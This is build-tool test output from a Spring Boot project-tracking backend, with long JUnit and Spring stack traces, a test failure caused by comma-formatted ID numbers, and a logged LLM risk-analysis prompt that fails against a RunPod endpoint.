	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.execute(TestMethodTestDescriptor.java:69) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:151) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596) ~[na:na]
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.invokeAll(SameThreadHierarchicalTestExecutorService.java:41) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:155) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596) ~[na:na]
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.invokeAll(SameThreadHierarchicalTestExecutorService.java:41) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:155) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.submit(SameThreadHierarchicalTestExecutorService.java:35) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.HierarchicalTestExecutor.execute(HierarchicalTestExecutor.java:57) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.HierarchicalTestEngine.execute(HierarchicalTestEngine.java:54) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:198) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:169) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:93) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.lambda$execute$0(EngineExecutionOrchestrator.java:58) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.withInterceptedStreams(EngineExecutionOrchestrator.java:141) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:57) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.DefaultLauncher.execute(DefaultLauncher.java:103) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.DefaultLauncher.execute(DefaultLauncher.java:85) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.DelegatingLauncher.execute(DelegatingLauncher.java:47) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.apache.maven.surefire.junitplatform.LazyLauncher.execute(LazyLauncher.java:56) ~[surefire-junit-platform-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.execute(JUnitPlatformProvider.java:184) ~[surefire-junit-platform-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.invokeAllTests(JUnitPlatformProvider.java:148) ~[surefire-junit-platform-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.invoke(JUnitPlatformProvider.java:122) ~[surefire-junit-platform-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.booter.ForkedBooter.runSuitesInProcess(ForkedBooter.java:385) ~[surefire-booter-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.booter.ForkedBooter.execute(ForkedBooter.java:162) ~[surefire-booter-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.booter.ForkedBooter.run(ForkedBooter.java:507) ~[surefire-booter-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.booter.ForkedBooter.main(ForkedBooter.java:495) ~[surefire-booter-3.1.2.jar:3.1.2]

[INFO] Tests run: 13, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.230 s -- in com.github.farzadsedaghatbin.shipflow.controller.DocumentControllerIntegrationTest
[INFO] Running com.github.farzadsedaghatbin.shipflow.controller.TaskDependencyControllerIntegrationTest

MockHttpServletRequest:
      HTTP Method = DELETE
      Request URI = /api/tasks/1/dependencies/99999
       Parameters = {}
          Headers = []
             Body = null
    Session Attrs = {}

Handler:
             Type = com.github.farzadsedaghatbin.shipflow.controller.TaskDependencyController
           Method = com.github.farzadsedaghatbin.shipflow.controller.TaskDependencyController#removeDependency(Long, Long)

Async:
    Async started = false
     Async result = null

Resolved Exception:
             Type = java.lang.IllegalArgumentException

ModelAndView:
        View name = null
             View = null
            Model = null

FlashMap:
       Attributes = null

MockHttpServletResponse:
           Status = 400
    Error message = null
          Headers = [Vary:"Origin", "Access-Control-Request-Method", "Access-Control-Request-Headers", Content-Type:"application/json", X-Content-Type-Options:"nosniff", X-XSS-Protection:"0", Cache-Control:"no-cache, no-store, max-age=0, must-revalidate", Pragma:"no-cache", Expires:"0", X-Frame-Options:"SAMEORIGIN"]
     Content type = application/json
             Body = {"message":"Dependency not found with id: 99,999","timestamp":"2026-01-17T23:26:45.065232","status":400}
    Forwarded URL = null
   Redirected URL = null
          Cookies = []
[ERROR] Tests run: 14, Failures: 1, Errors: 0, Skipped: 0, Time elapsed: 0.098 s <<< FAILURE! -- in com.github.farzadsedaghatbin.shipflow.controller.TaskDependencyControllerIntegrationTest
[ERROR] com.github.farzadsedaghatbin.shipflow.controller.TaskDependencyControllerIntegrationTest.removeDependency_NotFound_ReturnsBadRequest -- Time elapsed: 0.007 s <<< FAILURE!
java.lang.AssertionError: JSON path "$.message" expected:<Dependency not found with id: 99999> but was:<Dependency not found with id: 99,999>
	at org.springframework.test.util.AssertionErrors.fail(AssertionErrors.java:59)
	at org.springframework.test.util.AssertionErrors.assertEquals(AssertionErrors.java:122)
	at org.springframework.test.util.JsonPathExpectationsHelper.assertValue(JsonPathExpectationsHelper.java:123)
	at org.springframework.test.web.servlet.result.JsonPathResultMatchers.lambda$value$2(JsonPathResultMatchers.java:111)
	at org.springframework.test.web.servlet.MockMvc$1.andExpect(MockMvc.java:214)
	at com.github.farzadsedaghatbin.shipflow.controller.TaskDependencyControllerIntegrationTest.removeDependency_NotFound_ReturnsBadRequest(TaskDependencyControllerIntegrationTest.java:350)
	at java.base/java.lang.reflect.Method.invoke(Method.java:580)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)

[INFO] Running com.github.farzadsedaghatbin.shipflow.controller.MyWorkLogControllerIntegrationTest
2026-01-17T23:26:45.709Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.KnowledgeEventListener   : Handling work log event for work log ID: 15
2026-01-17T23:26:45.717Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.s.KnowledgeIngestionService      : Embedded knowledge item: worklog_15_0
2026-01-17T23:26:45.717Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.s.KnowledgeIngestionService      : Ingested work log: ID: 15
2026-01-17T23:26:45.949Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.KnowledgeEventListener   : Handling work log event for work log ID: 20
2026-01-17T23:26:45.956Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.s.KnowledgeIngestionService      : Embedded knowledge item: worklog_20_0
2026-01-17T23:26:45.957Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.s.KnowledgeIngestionService      : Ingested work log: ID: 20
[INFO] Tests run: 11, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.882 s -- in com.github.farzadsedaghatbin.shipflow.controller.MyWorkLogControllerIntegrationTest
[INFO] Running com.github.farzadsedaghatbin.shipflow.controller.TeamControllerIntegrationTest
[INFO] Tests run: 7, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.040 s -- in com.github.farzadsedaghatbin.shipflow.controller.TeamControllerIntegrationTest
[INFO] Running com.github.farzadsedaghatbin.shipflow.controller.SlackIntegrationControllerTest

  .   ____          _            __ _ _
 /\\ / ___'_ __ _ _(_)_ __  __ _ \ \ \ \
( ( )\___ | '_ | '_| | '_ \/ _` | \ \ \ \
 \\/  ___)| |_)| | | | | || (_| |  ) ) ) )
  '  |____| .__|_| |_|_| |_\__, | / / / /
 =========|_|==============|___/=/_/_/_/
 :: Spring Boot ::                (v3.2.1)

2026-01-17T23:26:46.088Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.c.SlackIntegrationControllerTest : Starting SlackIntegrationControllerTest using Java 21.0.2 with PID 89700 (started by farzad in /Users/farzad/IdeaProjects/git/shapeup-tracker/backend)
2026-01-17T23:26:46.088Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.c.SlackIntegrationControllerTest : Running with Spring Boot v3.2.1, Spring v6.1.2
2026-01-17T23:26:46.088Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.c.SlackIntegrationControllerTest : No active profile set, falling back to 1 default profile: "default"
2026-01-17T23:26:46.333Z  WARN 89700 --- [shipflow] [           main] .s.s.UserDetailsServiceAutoConfiguration : 

Using generated security password: d9a2cfab-2ad5-4083-9e9a-a83262c0b5f8

This generated password is for development use only. Your security configuration must be updated before running your application in production.

2026-01-17T23:26:46.334Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.s.JwtAuthenticationFilter        : Filter 'jwtAuthenticationFilter' configured for use
2026-01-17T23:26:46.336Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.c.SlackIntegrationControllerTest : Started SlackIntegrationControllerTest in 0.254 seconds (process running for 31.788)
[INFO] Tests run: 11, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.294 s -- in com.github.farzadsedaghatbin.shipflow.controller.SlackIntegrationControllerTest
[INFO] Running com.github.farzadsedaghatbin.shipflow.controller.PitchHealthControllerIntegrationTest
2026-01-17T23:26:46.392Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Cache miss: pitch risk 36 (withAI=true)
2026-01-17T23:26:46.394Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.config.RunPodChatModel    : Submitting prompt to RunPod: 688 chars
2026-01-17T23:26:46.394Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.config.RunPodChatModel    : RunPod request payload: {"input":{"max_tokens":2048,"temperature":0.3,"model":"mistral:instruct","prompt":"You are a project risk advisor for a software development team using the Shape Up methodology.\n\nAnalyze the following pitch and provide risk insights:\n\nPitch Title: Healthy Pitch\nDescription: Test description for Healthy Pitch\nAppetite: 14 days\nStatus: IN_PROGRESS\nProgress: 35.7%\nCycle Progress: 50.0%\nTeam: Health Test Team\n\nIdentified Risk Factors:\n- UNCLEAR_REQUIREMENTS: Pitch description is missing or too brief (Impact: 5/10)\n\nProvide your analysis in the following format:\nINSIGHTS:\n- [insight 1]\n- [insight 2]\n- [insight 3]\n\nRECOMMENDATIONS:\n- [recommendation 1]\n- [recommendation 2]\n- [recommendation 3]\n\nCONFIDENCE: [0-100]\n\nKeep insights actionable and specific to this pitch."}}
2026-01-17T23:26:46.400Z ERROR 89700 --- [shipflow] [           main] c.g.f.shipflow.config.RunPodChatModel    : RunPod API call failed: RunPod /run failed with status 500: {"messageKey":"error.generic","message":"An unexpected error occurred. Please try again.","timestamp":"2026-01-17T23:26:46.399704","status":500}

java.lang.RuntimeException: RunPod /run failed with status 500: {"messageKey":"error.generic","message":"An unexpected error occurred. Please try again.","timestamp":"2026-01-17T23:26:46.399704","status":500}
	at com.github.farzadsedaghatbin.shipflow.config.RunPodChatModel.submitJob(RunPodChatModel.java:128) ~[classes/:na]
	at com.github.farzadsedaghatbin.shipflow.config.RunPodChatModel.generate(RunPodChatModel.java:81) ~[classes/:na]
	at com.github.farzadsedaghatbin.shipflow.service.RiskAnalysisService.generateAIInsights(RiskAnalysisService.java:588) ~[classes/:na]
	at com.github.farzadsedaghatbin.shipflow.service.RiskAnalysisService.analyzePitchRisk(RiskAnalysisService.java:145) ~[classes/:na]
	at com.github.farzadsedaghatbin.shipflow.service.RiskAnalysisService.analyzePitchRisk(RiskAnalysisService.java:94) ~[classes/:na]
	at java.base/jdk.internal.reflect.DirectMethodHandleAccessor.invoke(DirectMethodHandleAccessor.java:103) ~[na:na]
	at java.base/java.lang.reflect.Method.invoke(Method.java:580) ~[na:na]
	at org.springframework.aop.support.AopUtils.invokeJoinpointUsingReflection(AopUtils.java:352) ~[spring-aop-6.1.2.jar:6.1.2]
	at org.springframework.aop.framework.ReflectiveMethodInvocation.invokeJoinpoint(ReflectiveMethodInvocation.java:196) ~[spring-aop-6.1.2.jar:6.1.2]
	at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:163) ~[spring-aop-6.1.2.jar:6.1.2]
	at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:765) ~[spring-aop-6.1.2.jar:6.1.2]
	at org.springframework.transaction.interceptor.TransactionInterceptor$1.proceedWithInvocation(TransactionInterceptor.java:123) ~[spring-tx-6.1.2.jar:6.1.2]
	at org.springframework.transaction.interceptor.TransactionAspectSupport.invokeWithinTransaction(TransactionAspectSupport.java:385) ~[spring-tx-6.1.2.jar:6.1.2]
	at org.springframework.transaction.interceptor.TransactionInterceptor.invoke(TransactionInterceptor.java:119) ~[spring-tx-6.1.2.jar:6.1.2]
	at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:184) ~[spring-aop-6.1.2.jar:6.1.2]
	at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:765) ~[spring-aop-6.1.2.jar:6.1.2]
	at org.springframework.aop.framework.CglibAopProxy$DynamicAdvisedInterceptor.intercept(CglibAopProxy.java:717) ~[spring-aop-6.1.2.jar:6.1.2]
	at com.github.farzadsedaghatbin.shipflow.service.RiskAnalysisService$$SpringCGLIB$$0.analyzePitchRisk(<generated>) ~[classes/:na]
	at com.github.farzadsedaghatbin.shipflow.service.PitchHealthService.buildPitchHealth(PitchHealthService.java:342) ~[classes/:na]
	at com.github.farzadsedaghatbin.shipflow.service.PitchHealthService.lambda$getCycleHealthSummary$2(PitchHealthService.java:200) ~[classes/:na]
	at java.base/java.util.stream.ReferencePipeline$3$1.accept(ReferencePipeline.java:197) ~[na:na]
	at java.base/java.util.ArrayList$ArrayListSpliterator.forEachRemaining(ArrayList.java:1708) ~[na:na]
	at java.base/java.util.stream.AbstractPipeline.copyInto(AbstractPipeline.java:509) ~[na:na]
	at java.base/java.util.stream.AbstractPipeline.wrapAndCopyInto(AbstractPipeline.java:499) ~[na:na]
	at java.base/java.util.stream.ReduceOps$ReduceOp.evaluateSequential(ReduceOps.java:921) ~[na:na]
	at java.base/java.util.stream.AbstractPipeline.evaluate(AbstractPipeline.java:234) ~[na:na]
	at java.base/java.util.stream.ReferencePipeline.collect(ReferencePipeline.java:682) ~[na:na]
	at com.github.farzadsedaghatbin.shipflow.service.PitchHealthService.getCycleHealthSummary(PitchHealthService.java:201) ~[classes/:na]
	at java.base/jdk.internal.reflect.DirectMethodHandleAccessor.invoke(DirectMethodHandleAccessor.java:103) ~[na:na]
	at java.base/java.lang.reflect.Method.invoke(Method.java:580) ~[na:na]
	at org.springframework.aop.support.AopUtils.invokeJoinpointUsingReflection(AopUtils.java:352) ~[spring-aop-6.1.2.jar:6.1.2]
	at org.springframework.aop.framework.ReflectiveMethodInvocation.invokeJoinpoint(ReflectiveMethodInvocation.java:196) ~[spring-aop-6.1.2.jar:6.1.2]
	at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:163) ~[spring-aop-6.1.2.jar:6.1.2]
	at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:765) ~[spring-aop-6.1.2.jar:6.1.2]
	at org.springframework.transaction.interceptor.TransactionInterceptor$1.proceedWithInvocation(TransactionInterceptor.java:123) ~[spring-tx-6.1.2.jar:6.1.2]
	at org.springframework.transaction.interceptor.TransactionAspectSupport.invokeWithinTransaction(TransactionAspectSupport.java:385) ~[spring-tx-6.1.2.jar:6.1.2]
	at org.springframework.transaction.interceptor.TransactionInterceptor.invoke(TransactionInterceptor.java:119) ~[spring-tx-6.1.2.jar:6.1.2]
	at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:184) ~[spring-aop-6.1.2.jar:6.1.2]
	at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:765) ~[spring-aop-6.1.2.jar:6.1.2]
	at org.springframework.aop.framework.CglibAopProxy$DynamicAdvisedInterceptor.intercept(CglibAopProxy.java:717) ~[spring-aop-6.1.2.jar:6.1.2]
	at com.github.farzadsedaghatbin.shipflow.service.PitchHealthService$$SpringCGLIB$$0.getCycleHealthSummary(<generated>) ~[classes/:na]
	at com.github.farzadsedaghatbin.shipflow.controller.PitchHealthController.getCycleHealthWithAI(PitchHealthController.java:57) ~[classes/:na]
	at java.base/jdk.internal.reflect.DirectMethodHandleAccessor.invoke(DirectMethodHandleAccessor.java:103) ~[na:na]
	at java.base/java.lang.reflect.Method.invoke(Method.java:580) ~[na:na]
	at org.springframework.web.method.support.InvocableHandlerMethod.doInvoke(InvocableHandlerMethod.java:262) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.method.support.InvocableHandlerMethod.invokeForRequest(InvocableHandlerMethod.java:190) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod.invokeAndHandle(ServletInvocableHandlerMethod.java:118) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.invokeHandlerMethod(RequestMappingHandlerAdapter.java:917) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.handleInternal(RequestMappingHandlerAdapter.java:829) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.mvc.method.AbstractHandlerMethodAdapter.handle(AbstractHandlerMethodAdapter.java:87) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:1089) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:979) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:1014) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.FrameworkServlet.doGet(FrameworkServlet.java:903) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at jakarta.servlet.http.HttpServlet.service(HttpServlet.java:564) ~[tomcat-embed-core-10.1.17.jar:6.0]
	at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:885) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.test.web.servlet.TestDispatcherServlet.service(TestDispatcherServlet.java:72) ~[spring-test-6.1.2.jar:6.1.2]
	at jakarta.servlet.http.HttpServlet.service(HttpServlet.java:658) ~[tomcat-embed-core-10.1.17.jar:6.0]
	at org.springframework.mock.web.MockFilterChain$ServletFilterProxy.doFilter(MockFilterChain.java:165) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132) ~[spring-test-6.1.2.jar:6.1.2]
	at com.github.farzadsedaghatbin.shipflow.security.MaliciousHeaderFilter.doFilter(MaliciousHeaderFilter.java:83) ~[classes/:na]
	at org.springframework.test.web.servlet.setup.MockMvcFilterDecorator.doFilter(MockMvcFilterDecorator.java:151) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:110) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.test.web.servlet.setup.MockMvcFilterDecorator.doFilter(MockMvcFilterDecorator.java:151) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.CompositeFilter$VirtualFilterChain.doFilter(CompositeFilter.java:108) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.security.web.FilterChainProxy.lambda$doFilterInternal$3(FilterChainProxy.java:231) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$FilterObservation$SimpleFilterObservation.lambda$wrap$1(ObservationFilterChainDecorator.java:479) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$AroundFilterObservation$SimpleAroundFilterObservation.lambda$wrap$1(ObservationFilterChainDecorator.java:340) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator.lambda$wrapSecured$0(ObservationFilterChainDecorator.java:82) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:128) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.access.intercept.AuthorizationFilter.doFilter(AuthorizationFilter.java:100) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.access.ExceptionTranslationFilter.doFilter(ExceptionTranslationFilter.java:126) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.access.ExceptionTranslationFilter.doFilter(ExceptionTranslationFilter.java:120) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.session.SessionManagementFilter.doFilter(SessionManagementFilter.java:131) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.session.SessionManagementFilter.doFilter(SessionManagementFilter.java:85) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.authentication.AnonymousAuthenticationFilter.doFilter(AnonymousAuthenticationFilter.java:100) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.servletapi.SecurityContextHolderAwareRequestFilter.doFilter(SecurityContextHolderAwareRequestFilter.java:179) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.savedrequest.RequestCacheAwareFilter.doFilter(RequestCacheAwareFilter.java:63) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at com.github.farzadsedaghatbin.shipflow.security.JwtAuthenticationFilter.doFilterInternal(JwtAuthenticationFilter.java:46) ~[classes/:na]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
